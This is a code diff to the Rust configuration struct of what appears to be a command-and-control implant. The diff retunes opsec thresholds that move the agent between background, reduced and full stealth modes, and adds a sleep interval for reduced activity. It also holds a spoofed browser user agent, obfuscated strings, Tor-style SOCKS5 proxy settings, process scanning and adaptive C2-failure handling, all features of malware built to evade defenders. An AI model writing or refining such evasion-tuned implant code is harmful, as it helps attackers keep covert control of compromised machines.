@@ -43,10 +43,10 @@ pub struct AgentConfig {
     pub proc_scan_interval_secs: u64,
     #[serde(default = "default_user_agent")]
     pub user_agent: String,
-    #[serde(default = "default_base_threshold_enter_full_opsec")]
-    pub base_threshold_enter_full_opsec: f32,
-    #[serde(default = "default_base_threshold_exit_full_opsec")]
-    pub base_threshold_exit_full_opsec: f32,
+    #[serde(default = "default_base_score_threshold_bg_to_reduced")]
+    pub base_score_threshold_bg_to_reduced: f32,
+    #[serde(default = "default_base_score_threshold_reduced_to_full")]
+    pub base_score_threshold_reduced_to_full: f32,
     #[serde(default = "default_min_duration_full_opsec")]
     pub min_duration_full_opsec_secs: u64,
     #[serde(default = "default_min_duration_background_opsec")]
@@ -55,6 +55,8 @@ pub struct AgentConfig {
     pub base_max_consecutive_c2_failures: u32,
     #[serde(default = "default_min_duration_reduced_activity_secs")]
     pub min_duration_reduced_activity_secs: u64,
+    #[serde(default = "default_reduced_activity_sleep_secs")]
+    pub reduced_activity_sleep_secs: u64,
     #[serde(default = "default_c2_failure_threshold_increase_factor")]
     pub c2_failure_threshold_increase_factor: f32,
     #[serde(default = "default_c2_failure_threshold_decrease_factor")]
@@ -80,12 +82,12 @@ fn default_user_agent() -> String {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string()
 }
 
-fn default_base_threshold_enter_full_opsec() -> f32 {
-    50.0
+fn default_base_score_threshold_bg_to_reduced() -> f32 {
+    20.0
 }
 
-fn default_base_threshold_exit_full_opsec() -> f32 {
-    25.0
+fn default_base_score_threshold_reduced_to_full() -> f32 {
+    60.0
 }
 
 fn default_min_duration_full_opsec() -> u64 {
@@ -102,6 +104,10 @@ fn default_base_max_consecutive_c2_failures() -> u32 {
 
 fn default_min_duration_reduced_activity_secs() -> u64 {
     120 // Default 2 minutes in ReducedActivity
+}
+
+fn default_reduced_activity_sleep_secs() -> u64 {
+    120 // Default 2 minutes sleep for ReducedActivity
 }
 
 fn default_c2_failure_threshold_increase_factor() -> f32 {
@@ -128,17 +134,18 @@ impl Default for AgentConfig {
             jitter: 2,
             payload_id: String::new(),
             protocol: obfstr!("http").to_string(),
-            socks5_enabled: true,
+            socks5_enabled: false,
             socks5_host: obfstr!("127.0.0.1").to_string(),
             socks5_port: 9050,
             proc_scan_interval_secs: default_proc_scan_interval(),
             user_agent: default_user_agent(),
-            base_threshold_enter_full_opsec: default_base_threshold_enter_full_opsec(),
-            base_threshold_exit_full_opsec: default_base_threshold_exit_full_opsec(),
+            base_score_threshold_bg_to_reduced: default_base_score_threshold_bg_to_reduced(),
+            base_score_threshold_reduced_to_full: default_base_score_threshold_reduced_to_full(),
             min_duration_full_opsec_secs: default_min_duration_full_opsec(),
             min_duration_background_opsec_secs: default_min_duration_background_opsec(),
             base_max_consecutive_c2_failures: default_base_max_consecutive_c2_failures(),
             min_duration_reduced_activity_secs: default_min_duration_reduced_activity_secs(),
+            reduced_activity_sleep_secs: default_reduced_activity_sleep_secs(),
             c2_failure_threshold_increase_factor: default_c2_failure_threshold_increase_factor(),
             c2_failure_threshold_decrease_factor: default_c2_failure_threshold_decrease_factor(),
             c2_threshold_adjust_interval_secs: default_c2_threshold_adjust_interval_secs(),
